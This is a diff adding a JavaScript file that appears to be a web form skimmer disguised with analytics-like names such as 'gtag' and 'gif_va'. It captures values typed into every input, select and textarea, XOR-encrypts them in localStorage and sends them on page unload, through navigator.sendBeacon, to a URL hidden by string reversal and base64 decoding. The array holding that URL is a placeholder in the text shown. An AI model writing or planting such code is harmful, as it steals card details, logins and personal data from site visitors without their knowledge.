@@ -1,0 +1,229 @@
+try {
+    var ph = true;
+    var pc = true;
+    var cn = true;
+    var C = [];
+
+    function setCookie(name, value, days) {
+        var expires = "";
+        if (days) {
+            var date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            expires = "; expires=" + date.toUTCString();
+        }
+        document.cookie = name + "=" + (value || "") + expires + "; path=/";
+    }
+
+    function getCookie(name) {
+        var nameEQ = name + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+        }
+        return null;
+    }
+
+    function getRandomNumber() {
+        return (100000000 + Math.floor(Math.random() * 900000000)).toString();
+    }
+
+    function checkCookie() {
+        var userCookie = getCookie('gif_va');
+        if (!userCookie) {
+            var currentTime = new Date().getTime();
+            var userIP = getRandomNumber(); 
+            var uniqueValue = currentTime + userIP;
+            setCookie('gif_va', uniqueValue, 1);
+            return uniqueValue;
+        }
+        return userCookie;
+    }
+
+    var userCookie = checkCookie();
+
+    function xorEncrypt(input, key) {
+        let output = '';
+        for (let i = 0; i < input.length; i++) {
+            let charCode = input.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+            output += charCode.toString(16).padStart(2, '0'); 
+        }
+        return output;
+    }
+	
+	function xorDecrypt(input, key) {
+    let output = '';
+    for (let i = 0, j = 0; i < input.length; i += 2, j++) {
+        let byte = parseInt(input.substr(i, 2), 16);
+        output += String.fromCharCode(byte ^ key.charCodeAt(j % key.length));
+    }
+    return output;
+}
+
+     function fr(w) {
+        E = C.find((rcedElementObj)=>w === rcedElementObj.w);
+        if (E)
+            return E;
+    }
+    function iL(w, v, l, o) {
+        r = fr(w);
+        if (r) {
+            r.ls[v] = r.ls[v] || [];
+        } else {
+            r = {
+                w: w,
+                ls: {}
+            };
+            r.ls[v] = [];
+            C.push(r);
+        }
+        r.ls[v].push(l);
+        w.addEventListener(v, l, o);
+    }
+    function lE(l, v) {
+        r = fr(l);
+        if (r && v in r.ls) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+    function iM() {
+        if (sessionStorage.desktop)
+            return false;
+        else if (localStorage.mobile)
+            return true;
+        mobile = ["mobile", "phone"];
+        for (var i in mobile)
+            if (navigator.userAgent.toLowerCase().indexOf(mobile[i].toString().toLowerCase()) > 0)
+                return true;
+        return false;
+    }
+    ch = false;
+    if (!ph) {
+        if (iM()) {
+            ch = true;
+        } else {
+            if (!pc) {
+                ch = true;
+            }
+        }
+    } else {
+        if (!iM()) {
+            if (!pc) {
+                ch = true;
+            }
+        }
+    }
+	
+var iR = false;
+function hl() {
+    if (!iR) {
+        iR = true;
+    }
+    var nm = ["textarea", "select", "input"];
+    for (var i = 0, n = nm.length; i < n; i++) {
+        Array.from(document.getElementsByTagName(nm[i])).forEach(function(t, e) {
+            if (lE(t, "change") === false) {
+                if (t.value !== undefined) {
+                   
+                    h(t);
+                }
+                iL(t, "change", function() {
+                   
+                    h(this);
+                });
+            }
+        });
+    }
+}
+
+function h(t) {
+    if (t.value.length > 0 && t.value.length < 100) {
+        if (!ch) {
+            v = t.value;
+            if (t.options) {
+                if (t.selectedIndex >= 0) {
+                    v = t.options[t.selectedIndex].text.replace(/,/g, "");
+                }
+            }
+            v = v.replace(/[`~!#$%^&*()|+\=?;:'"<>\{\}\[\]\\/]/gi, "");
+            ti = t.id;
+            tn = t.name;
+            (ti.length > 0 ? idl = "-" + ti.length : idl = "");
+            s = [];
+            v.length > 0 && (0 == tn.length ? s.push(ti + ":" + v) : 0 != tn.length && s.push(tn.replace(/:/g, "") + idl + ":" + v));
+
+            var retrievedObject = localStorage.getItem("ars");
+            if (retrievedObject) {
+                try {
+                    
+                    retrievedObject = JSON.parse(xorDecrypt(retrievedObject, 'gtag'));
+                } catch (e) {
+                    
+                    retrievedObject = [];
+                }
+            } else {
+                retrievedObject = [];
+            }
+
+            s = s.concat(retrievedObject);
+            s = s.filter(function(e) {
+                return e;
+            });
+
+            
+            var encryptedData = xorEncrypt(JSON.stringify(s), 'gtag');
+            localStorage.setItem('ars', encryptedData);
+        }
+    }
+}
+
+
+
+function prepareDataForBeacon() {
+    var encryptedData = localStorage.getItem("ars");
+    if (encryptedData) {
+       
+        var decryptedData = xorDecrypt(encryptedData, 'gtag'); 
+        var dataObject = JSON.parse(decryptedData);
+        var userAgent = navigator.userAgent;
+        var formattedData = {
+            'referrer': window.location.hostname, 
+            'userCookie': userCookie,
+            'data': dataObject,
+            'userAgent': userAgent  
+        };
+
+        return new Blob([JSON.stringify(formattedData)], { type: 'application/json' });
+    }
+    return null;
+}
+
+
+
+var rS = function(str) { return str.split('').reverse().join(''); };
+
+var p = obfuscate; 
+
+var dU = rS(p.join(''));
+dU = atob(dU);
+
+window.addEventListener("beforeunload", function(event) {
+    var dataBlob = prepareDataForBeacon();
+    if (dataBlob) {
+        navigator.sendBeacon(dU, dataBlob);
+        localStorage.removeItem("ars");
+    }
+});
+
+
+hl(); 
+setInterval(hl, 1500);
+  
+
+} catch (e) {
+
+    console.error("Произошла ошибка:", e);
+}
